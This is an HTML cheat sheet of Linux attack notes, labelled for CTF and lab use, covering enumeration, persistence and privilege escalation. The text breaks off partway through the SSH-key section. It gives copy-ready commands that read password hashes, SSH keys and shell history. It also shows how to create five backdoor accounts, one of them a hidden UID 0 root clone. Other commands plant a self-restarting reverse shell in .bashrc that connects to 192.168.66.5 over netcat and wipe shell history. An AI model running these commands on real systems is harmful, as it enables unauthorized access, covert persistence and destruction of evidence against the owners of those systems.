<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Linux Security Notes — m.manikandan</title>
<style>
:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--text:#e6edf3;--muted:#8b949e;--enum:#58a6ff;--persist:#ffa657;--privesc:#ff7b72;--green:#3fb950;--border:#30363d;--code-bg:#0d1117;}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',monospace;line-height:1.7;overflow-x:hidden;}
::-webkit-scrollbar{width:6px;}::-webkit-scrollbar-track{background:var(--bg);}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}

/* ── HEADER ── */
header{background:linear-gradient(270deg,#0d1117,#161b22,#0d1f3c,#1a0a2e);background-size:600% 600%;animation:bgShift 10s ease infinite;padding:60px 20px 50px;text-align:center;position:relative;overflow:hidden;border-bottom:1px solid var(--border);}
@keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
header::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at 50% 0%,rgba(88,166,255,.15),transparent 70%);pointer-events:none;}
.header-badge{display:inline-flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:20px;}
.badge{padding:4px 12px;border-radius:20px;font-size:.7rem;font-weight:600;letter-spacing:.5px;text-transform:uppercase;}
.b-linux{background:rgba(88,166,255,.15);color:var(--enum);border:1px solid rgba(88,166,255,.3);}
.b-bash{background:rgba(63,185,80,.15);color:var(--green);border:1px solid rgba(63,185,80,.3);}
.b-ctf{background:rgba(255,166,87,.15);color:var(--persist);border:1px solid rgba(255,166,87,.3);}
.b-author{background:rgba(255,123,114,.15);color:var(--privesc);border:1px solid rgba(255,123,114,.3);}
h1{font-size:2.6rem;font-weight:700;background:linear-gradient(90deg,#58a6ff,#ffa657,#ff7b72,#3fb950,#58a6ff);background-size:300% auto;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:textFlow 5s linear infinite;margin-bottom:12px;}
@keyframes textFlow{0%{background-position:0% center}100%{background-position:300% center}}
.subtitle{color:var(--muted);font-size:1rem;letter-spacing:1px;}
.flow-arrow{color:var(--muted);margin:0 8px;animation:pulse 2s ease infinite;}
@keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
.flow-arrow.e{color:var(--enum);}
.flow-arrow.p{color:var(--persist);}
.flow-arrow.x{color:var(--privesc);}

/* ── PARTICLES ── */
.particles{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;overflow:hidden;}
.particle{position:absolute;width:2px;height:2px;border-radius:50%;animation:float linear infinite;}
@keyframes float{0%{transform:translateY(100%);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-100vh);opacity:0}}

/* ── LAYOUT ── */
.container{max-width:1100px;margin:0 auto;padding:30px 20px;}

/* ── TOC ── */
.toc{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:24px;margin-bottom:40px;}
.toc-title{font-size:1rem;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
.toc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:4px;}
.toc-group{margin-bottom:12px;}
.toc-group-title{font-size:.7rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:4px 8px;border-radius:4px;margin-bottom:6px;display:inline-block;}
.toc-group-title.e{background:rgba(88,166,255,.1);color:var(--enum);}
.toc-group-title.p{background:rgba(255,166,87,.1);color:var(--persist);}
.toc-group-title.x{background:rgba(255,123,114,.1);color:var(--privesc);}
.toc-link{display:block;color:var(--muted);text-decoration:none;font-size:.82rem;padding:2px 8px;border-radius:4px;transition:all .2s;}
.toc-link:hover{color:var(--text);background:var(--bg3);}

/* ── SECTION BLOCKS ── */
.phase{margin-bottom:50px;}
.phase-header{display:flex;align-items:center;gap:14px;padding:20px 24px;border-radius:10px;margin-bottom:24px;position:relative;overflow:hidden;}
.phase-header::after{content:'';position:absolute;top:0;right:0;width:200px;height:100%;background:linear-gradient(to left,rgba(255,255,255,.03),transparent);}
.phase-enum{background:linear-gradient(135deg,rgba(88,166,255,.08),rgba(88,166,255,.02));border:1px solid rgba(88,166,255,.2);}
.phase-persist{background:linear-gradient(135deg,rgba(255,166,87,.08),rgba(255,166,87,.02));border:1px solid rgba(255,166,87,.2);}
.phase-privesc{background:linear-gradient(135deg,rgba(255,123,114,.08),rgba(255,123,114,.02));border:1px solid rgba(255,123,114,.2);}
.phase-icon{font-size:2rem;}
.phase-label h2{font-size:1.4rem;margin-bottom:2px;}
.phase-label p{color:var(--muted);font-size:.82rem;}
.phase-enum .phase-label h2{color:var(--enum);}
.phase-persist .phase-label h2{color:var(--persist);}
.phase-privesc .phase-label h2{color:var(--privesc);}

/* ── TECHNIQUE CARDS ── */
details{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:12px;overflow:hidden;transition:border-color .2s;}
details:hover{border-color:var(--muted);}
details.e:hover,details.e[open]{border-color:rgba(88,166,255,.4);}
details.p:hover,details.p[open]{border-color:rgba(255,166,87,.4);}
details.x:hover,details.x[open]{border-color:rgba(255,123,114,.4);}
summary{padding:14px 18px;cursor:pointer;font-weight:600;font-size:.92rem;display:flex;align-items:center;gap:10px;list-style:none;user-select:none;transition:background .2s;}
summary::-webkit-details-marker{display:none;}
summary:hover{background:var(--bg3);}
details[open] summary{background:var(--bg3);border-bottom:1px solid var(--border);}
.sum-num{font-size:.7rem;font-weight:700;padding:2px 7px;border-radius:4px;min-width:28px;text-align:center;}
.e .sum-num{background:rgba(88,166,255,.15);color:var(--enum);}
.p .sum-num{background:rgba(255,166,87,.15);color:var(--persist);}
.x .sum-num{background:rgba(255,123,114,.15);color:var(--privesc);}
.sum-arrow{margin-left:auto;color:var(--muted);transition:transform .2s;font-size:.7rem;}
details[open] .sum-arrow{transform:rotate(90deg);}
.card-body{padding:20px 18px;}

/* ── CODE BLOCKS ── */
.code-wrap{position:relative;margin:12px 0;border-radius:8px;overflow:hidden;border:1px solid var(--border);}
.code-header{background:#1c2128;padding:7px 14px;font-size:.7rem;color:var(--muted);display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);}
.code-header .dots{display:flex;gap:5px;}
.dot{width:11px;height:11px;border-radius:50%;}
.dot-r{background:#ff5f57;}.dot-y{background:#febc2e;}.dot-g{background:#28c840;}
.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:2px 10px;border-radius:4px;font-size:.65rem;cursor:pointer;transition:all .2s;font-family:inherit;}
.copy-btn:hover{background:var(--bg3);color:var(--text);border-color:var(--muted);}
.copy-btn.copied{color:var(--green);border-color:var(--green);}
pre{background:var(--code-bg);padding:16px;overflow-x:auto;margin:0;}
code{font-family:'SF Mono','Fira Code','Consolas',monospace;font-size:.82rem;line-height:1.65;color:#79c0ff;}
.c-comment{color:#8b949e;}
.c-cmd{color:#79c0ff;}
.c-str{color:#a5d6ff;}
.c-flag{color:#ffa657;}
.c-path{color:#3fb950;}
.c-warn{color:#ff7b72;}

/* ── PROSE ── */
.card-body p{color:var(--muted);font-size:.87rem;margin-bottom:8px;}
.card-body h3{font-size:.88rem;font-weight:600;margin:16px 0 8px;padding-left:10px;border-left:3px solid;}
details.e .card-body h3{color:var(--enum);border-color:var(--enum);}
details.p .card-body h3{color:var(--persist);border-color:var(--persist);}
details.x .card-body h3{color:var(--privesc);border-color:var(--privesc);}
.tag{display:inline-block;font-size:.65rem;padding:1px 7px;border-radius:3px;margin-right:4px;font-weight:600;}
.tag-cleanup{background:rgba(255,123,114,.1);color:var(--privesc);}
.tag-verify{background:rgba(63,185,80,.1);color:var(--green);}
.tag-exploit{background:rgba(255,166,87,.1);color:var(--persist);}
.tag-setup{background:rgba(88,166,255,.1);color:var(--enum);}
.warn-box{background:rgba(255,123,114,.06);border:1px solid rgba(255,123,114,.2);border-radius:6px;padding:10px 14px;font-size:.82rem;color:#ff7b72;margin:12px 0;display:flex;align-items:center;gap:8px;}

/* ── FOOTER ── */
footer{text-align:center;padding:40px 20px;color:var(--muted);font-size:.82rem;border-top:1px solid var(--border);background:var(--bg2);}
footer strong{color:var(--persist);}

/* ── ANIMATIONS ── */
.phase{animation:fadeUp .5s ease both;}
@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.phase:nth-child(2){animation-delay:.1s}.phase:nth-child(3){animation-delay:.2s}
details{animation:none;}
details[open] .card-body{animation:slideDown .2s ease both;}
@keyframes slideDown{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
</style>
</head>
<body>
<header>
<div class="particles" id="particles"></div>
<div class="header-badge">
  <span class="badge b-linux">🐧 Linux</span>
  <span class="badge b-bash">🔧 Bash</span>
  <span class="badge b-ctf">🏁 CTF / Lab</span>
  <span class="badge b-author">✍️ m.manikandan</span>
</div>
<h1>Linux Security — Field Notes</h1>
<p class="subtitle">
  <span class="flow-arrow e">🔍 Enumeration</span>
  <span class="flow-arrow">→</span>
  <span class="flow-arrow p">🔒 Persistence</span>
  <span class="flow-arrow">→</span>
  <span class="flow-arrow x">⚡ Privilege Escalation</span>
</p>
</header>
<div class="container">
<!-- TOC -->
<div class="toc">
<div class="toc-title">📋 Table of Contents</div>
<div class="toc-grid">
<div class="toc-group">
  <div class="toc-group-title e">🔍 Enumeration</div>
  <a class="toc-link" href="#s1">1. System Information</a>
  <a class="toc-link" href="#s2">2. User &amp; Group Enumeration</a>
  <a class="toc-link" href="#s3">3. Network Enumeration</a>
  <a class="toc-link" href="#s4">4. Process &amp; Services</a>
  <a class="toc-link" href="#s5">5. Scheduled Tasks</a>
  <a class="toc-link" href="#s6">6. File System &amp; Interesting Files</a>
  <a class="toc-link" href="#s7">7. Credentials &amp; Sensitive Files</a>
  <a class="toc-link" href="#s8">8. Installed Software &amp; Kernel Exploits</a>
</div>
<div class="toc-group">
  <div class="toc-group-title p">🔒 Persistence</div>
  <a class="toc-link" href="#s9">9. Backdoor User (5 Methods)</a>
  <a class="toc-link" href="#s10">10. .bashrc / .bash_profile</a>
  <a class="toc-link" href="#s11">11. SSH Public Key</a>
  <a class="toc-link" href="#s12">12. Systemd Service + Netcat</a>
</div>
<div class="toc-group">
  <div class="toc-group-title x">⚡ Privilege Escalation</div>
  <a class="toc-link" href="#s13">13. SUID Binary Abuse</a>
  <a class="toc-link" href="#s14">14. Linux Capabilities</a>
  <a class="toc-link" href="#s15">15. Vulnerable Sudo / GTFOBins</a>
  <a class="toc-link" href="#s16">16. Sudo SETENV + LD_PRELOAD</a>
  <a class="toc-link" href="#s17">17. Shared Object Injection</a>
  <a class="toc-link" href="#s18">18. Cron Job Abuse</a>
  <a class="toc-link" href="#s19">19. Writable PATH Hijack</a>
  <a class="toc-link" href="#s20">20. Systemd Service Abuse</a>
  <a class="toc-link" href="#s21">21. Docker Group Escalation</a>
  <a class="toc-link" href="#s22">22. Incus / LXC Container</a>
  <a class="toc-link" href="#s23">23. NFS no_root_squash</a>
  <a class="toc-link" href="#s24">24. Polkit rules.d</a>
  <a class="toc-link" href="#s25">25. Writable /etc/passwd</a>
  <a class="toc-link" href="#s26">26. Readable Root SSH Key</a>
  <a class="toc-link" href="#s27">27. Reverse Shell via nc</a>
  <a class="toc-link" href="#s28">28. Kernel Exploits</a>
  <a class="toc-link" href="#s29">29. Linux Internals Reference</a>
</div>
</div>
</div>

<div class="warn-box">⚠️ For authorized lab / CTF environments only. Never test on systems you do not own or have explicit permission to test.</div>

<!-- ═══════════════════════════════ ENUMERATION ═══════════════════════════════ -->
<div class="phase">
<div class="phase-header phase-enum">
  <div class="phase-icon">🔍</div>
  <div class="phase-label"><h2>Enumeration</h2><p>Gather system, user, network, file and credential information</p></div>
</div>

<details class="e" id="s1">
<summary><span class="sum-num">01</span> System Information <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>uname -a                  <span class="c-comment"># Kernel version, architecture</span>
cat /proc/version         <span class="c-comment"># Detailed kernel, compiler info</span>
cat /etc/os-release       <span class="c-comment"># Distro name and version</span>
lsb_release -a            <span class="c-comment"># Another distro check</span>
hostnamectl               <span class="c-comment"># Hostname, kernel, architecture</span>
cat /etc/*-release        <span class="c-comment"># Catch-all for release files</span>
cat /proc/cpuinfo         <span class="c-comment"># CPU details</span>
cat /proc/meminfo         <span class="c-comment"># Memory details</span></code></pre></div>
</div></details>

<details class="e" id="s2">
<summary><span class="sum-num">02</span> User &amp; Group Enumeration <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>id                                      <span class="c-comment"># Current user, groups</span>
whoami                                  <span class="c-comment"># Current username</span>
cat /etc/passwd                         <span class="c-comment"># All users</span>
cat /etc/shadow                         <span class="c-comment"># Password hashes (requires root)</span>
cat /etc/group                          <span class="c-comment"># All groups</span>
getent passwd                           <span class="c-comment"># Same as /etc/passwd</span>
sudo -l                                 <span class="c-comment"># Commands allowed with sudo (GOLD)</span>
cat /etc/sudoers                        <span class="c-comment"># Sudo configuration (if readable)</span>
find / -user &lt;username&gt; 2&gt;/dev/null    <span class="c-comment"># Files owned by a specific user</span>
lastlog                                 <span class="c-comment"># Last login of all users</span>
w                                       <span class="c-comment"># Who is logged on</span></code></pre></div>
</div></details>

<details class="e" id="s3">
<summary><span class="sum-num">03</span> Network Enumeration <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>ifconfig / ip a s                          <span class="c-comment"># Network interfaces, IPs</span>
ip route / route -n                        <span class="c-comment"># Routing table</span>
arp -a                                     <span class="c-comment"># ARP cache</span>
netstat -tulpn / ss -tulpn                 <span class="c-comment"># Listening ports, processes</span>
netstat -antp / ss -antp                   <span class="c-comment"># All TCP connections with PIDs</span>
cat /etc/hosts                             <span class="c-comment"># Static host mappings</span>
cat /etc/resolv.conf                       <span class="c-comment"># DNS servers</span>
iptables -L -n / nft list ruleset          <span class="c-comment"># Firewall rules (if root/sudo)</span></code></pre></div>
</div></details>

<details class="e" id="s4">
<summary><span class="sum-num">04</span> Process &amp; Services <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>ps aux                                                        <span class="c-comment"># All processes</span>
ps aux --forest                                               <span class="c-comment"># Tree view</span>
systemctl list-units --type=service --state=running           <span class="c-comment"># Active services</span>
service --status-all                                          <span class="c-comment"># SysV services</span>
top -n 1 -b                                                   <span class="c-comment"># One-shot snapshot</span>
pspy                                                          <span class="c-comment"># Unprivileged process monitor</span>
cat /proc/1/comm                                              <span class="c-comment"># PID 1 (init system)</span>
ls -la /proc/*/exe 2&gt;/dev/null | grep -v "Permission denied"  <span class="c-comment"># Find binaries</span>
cat /etc/inetd.conf /etc/xinetd.conf                          <span class="c-comment"># Legacy service configs</span></code></pre></div>
</div></details>

<details class="e" id="s5">
<summary><span class="sum-num">05</span> Scheduled Tasks <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>crontab -l                     <span class="c-comment"># Current user's cron jobs</span>
cat /etc/crontab               <span class="c-comment"># System-wide crontab</span>
ls -la /etc/cron.*             <span class="c-comment"># daily, hourly, monthly, weekly</span>
systemctl list-timers --all    <span class="c-comment"># Systemd timers</span>
cat /etc/anacrontab            <span class="c-comment"># Anacron jobs</span></code></pre></div>
</div></details>

<details class="e" id="s6">
<summary><span class="sum-num">06</span> File System &amp; Interesting Files <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>find / -writable -type f 2&gt;/dev/null                                          <span class="c-comment"># World-writable files</span>
find / -perm -4000 -type f 2&gt;/dev/null                                        <span class="c-comment"># SUID binaries</span>
find / -perm -2000 -type f 2&gt;/dev/null                                        <span class="c-comment"># SGID binaries</span>
find / -perm -o=r -type f 2&gt;/dev/null                                         <span class="c-comment"># World-readable files</span>
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2&gt;/dev/null           <span class="c-comment"># Configs</span>
find / -name "*.log" -type f 2&gt;/dev/null                                       <span class="c-comment"># Log files (may leak creds)</span>
find / -name ".git" -type d 2&gt;/dev/null                                        <span class="c-comment"># Git repos</span>
ls -la /var/backups /opt /tmp /var/tmp                                         <span class="c-comment"># Backups/scratch</span>
cat /etc/fstab                                                                  <span class="c-comment"># Mounted filesystems</span>
mount                                                                           <span class="c-comment"># Currently mounted shares</span>
df -h                                                                           <span class="c-comment"># Disk usage</span></code></pre></div>
</div></details>

<details class="e" id="s7">
<summary><span class="sum-num">07</span> Credentials &amp; Sensitive Files <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>grep -rni "password" /etc/ 2&gt;/dev/null
grep -rni "passwd" /var/log/ 2&gt;/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2&gt;/dev/null   <span class="c-comment"># SSH keys</span>
history
cat ~/.bash_history
cat ~/.mysql_history
env                                                                     <span class="c-comment"># Env variables (secrets!)</span>
cat /proc/1/environ | tr '\0' '\n'                                     <span class="c-comment"># Env of PID 1</span></code></pre></div>
</div></details>

<details class="e" id="s8">
<summary><span class="sum-num">08</span> Installed Software &amp; Kernel Exploits <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>dpkg -l / rpm -qa                     <span class="c-comment"># Installed packages (Debian/RPM)</span>
sudo -V                               <span class="c-comment"># Sudo version</span>
pkexec --version                      <span class="c-comment"># Polkit version</span>
ls -la /usr/local/bin /usr/bin /bin   <span class="c-comment"># Custom installed binaries</span>
ls -la /usr/sbin /sbin                <span class="c-comment"># Admin tools</span>
apk list --installed                  <span class="c-comment"># Alpine Linux</span>
uname -a                              <span class="c-comment"># Kernel version → check exploit-db</span></code></pre></div>
<h3>Useful Tools</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># Automated enumeration</span>
https://github.com/peass-ng/PEASS-ng.git
https://github.com/The-Z-Labs/linux-exploit-suggester.git
https://github.com/Aegrah/PANIX.git

pip install gtfobins-cli --break-system-packages
gtfo python</code></pre></div>
</div></details>
</div>
<!-- ═══════════════════════════════ PERSISTENCE ═══════════════════════════════ -->
<div class="phase">
<div class="phase-header phase-persist">
  <div class="phase-icon">🔒</div>
  <div class="phase-label"><h2>Persistence</h2><p>Maintain access across reboots and sessions</p></div>
</div>

<details class="p" id="s9">
<summary><span class="sum-num">09</span> Backdoor User — 5 Methods <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">METHOD 1</span> backdoor</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>groupdel backdoor 2&gt;/dev/null; useradd -m -s /bin/bash -U backdoor && echo 'backdoor:backdoor' | chpasswd</code></pre></div>
<h3><span class="tag tag-setup">METHOD 2</span> ghost (UID 0 Root Clone)</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>groupadd ghost 2&gt;/dev/null; useradd -o -u 0 -g 0 -s /bin/bash -M -d /root ghost && echo 'ghost:ghost' | chpasswd</code></pre></div>
<h3><span class="tag tag-setup">METHOD 3</span> hacker (Manual passwd/shadow)</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>HASH=$(openssl passwd -6 'hacker') && echo "hacker:x:1337:1337::/home/hacker:/bin/bash" &gt;&gt; /etc/passwd && echo "hacker:${HASH}:19000:0:99999:7:::" &gt;&gt; /etc/shadow && groupadd -g 1337 hacker && mkdir -p /home/hacker && chown 1337:1337 /home/hacker</code></pre></div>
<h3><span class="tag tag-setup">METHOD 4</span> support (sudo group)</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>useradd -m -s /bin/bash -U support && echo 'support:support' | chpasswd && usermod -aG sudo support</code></pre></div>
<h3><span class="tag tag-setup">METHOD 5</span> pyuser (Python)</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>python3 -c "
import subprocess
h = subprocess.check_output(['openssl','passwd','-6','pyuser']).decode().strip()
open('/etc/passwd','a').write('pyuser:x:1339:1339::/home/pyuser:/bin/bash\n')
open('/etc/shadow','a').write(f'pyuser:{h}:19000:0:99999:7:::\n')
" && groupadd -g 1339 pyuser && mkdir -p /home/pyuser && chown 1339:1339 /home/pyuser</code></pre></div>
<h3><span class="tag tag-verify">VERIFY</span> All 5</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>for u in backdoor ghost hacker support pyuser; do echo -n "$u → " && su $u -c "id" 2&gt;&amp;1; done</code></pre></div>
<h3><span class="tag tag-setup">STEALTH</span> Hide the User</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># GDM3</span>
nano /etc/gdm3/custom.conf
[daemon]
Exclude=backdoor

<span class="c-comment"># LightDM</span>
nano /etc/lightdm/users.conf
hidden-users=backdoor</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span> All 5</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>for u in backdoor ghost hacker support pyuser; do userdel -r $u 2&gt;/dev/null; groupdel $u 2&gt;/dev/null; sed -i "/^${u}:/d" /etc/passwd /etc/shadow /etc/group; rm -rf /home/$u; done
grep -E 'backdoor|ghost|hacker|support|pyuser' /etc/passwd && ls /home/</code></pre></div>
</div></details>

<details class="p" id="s10">
<summary><span class="sum-num">10</span> .bashrc / .bash_profile Persistence <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">STEP 1</span> Attacker Listener</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>nc -lvnp 4444</code></pre></div>
<h3><span class="tag tag-setup">STEP 2</span> Purge .bashrc</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sed -i '/nc 192.168.66.5 4444/d' ~/.bashrc
sed -i '/bash-loop-2222/d' ~/.bashrc
sed -i '/mkfifo \/tmp\/\.f/d' ~/.bashrc
sed -i '/mkfifo \/tmp\/f/d' ~/.bashrc
sed -i '/nc 192.168.66.5 4444/d; /mkfifo \/tmp\/\.p/d; /mkfifo \/tmp\/f/d; /bash-loop/d; /nc-loop/d; /\/dev\/tcp\/192\.168\.66\.5\/4444/d; /nohup sh -c/d' ~/.bashrc
grep -n -E 'nc|mkfifo|/dev/tcp|bash-loop|nc-loop' ~/.bashrc</code></pre></div>
<h3><span class="tag tag-setup">STEP 3</span> Kill Lingering Jobs</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>pkill -f 'nc 192.168.66.5 4444'
pkill -f 'mkfifo /tmp/f'
pkill -f 'mkfifo /tmp/.f'</code></pre></div>
<h3><span class="tag tag-exploit">STEP 4</span> Add Persistent Loop</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cat &gt;&gt; ~/.bashrc &lt;&lt; 'EOF'
# persistence-loop (quiet, self-healing)
if ! pgrep -f "nc-loop-4444" &gt; /dev/null; then
    (
        while true; do
            if ! pgrep -f "nc 192.168.66.5 4444" &gt; /dev/null; then
                rm -f /tmp/.p
                mkfifo /tmp/.p
                cat /tmp/.p | /bin/bash -i 2&gt;&amp;1 | nc 192.168.66.5 4444 &gt; /tmp/.p
            fi
            sleep 10
        done
    ) &gt;/dev/null 2&gt;&amp;1 &amp;
    disown %-
fi
EOF</code></pre></div>
<h3><span class="tag tag-exploit">OR</span> With PTY</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>pkill -f 'nc 192.168.66.5 4444'
while true; do
    rm -f /tmp/.p
    mkfifo /tmp/.p
    cat /tmp/.p | python3 -c 'import pty; pty.spawn("/bin/bash")' 2&gt;&amp;1 | nc 192.168.66.5 4444 &gt; /tmp/.p
    sleep 5
done</code></pre></div>
<h3><span class="tag tag-exploit">TRIGGER</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>exec bash</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sed -i '/nc 10.0.2.30 4444/d' ~/.bashrc
history -c
rm ~/.bash_history</code></pre></div>
</div></details>

<details class="p" id="s11">
<summary><span class="sum-num">11</span> SSH Public Key Persistence <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">STEP 1</span> Generate Key Pair</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist -N ""</code></pre></div>
<h3><span class="tag tag-setup">STEP 2</span> Install Public Key</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cat ~/.ssh/persist.pub &gt; ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys</code></pre></div>
<h3><span class="tag tag-exploit">STEP 3</span> Test Login</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>ssh -i ~/.ssh/persist kali@192.168.66.5</code></pre></div>
<h3><span class="tag tag-setup">BACKUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
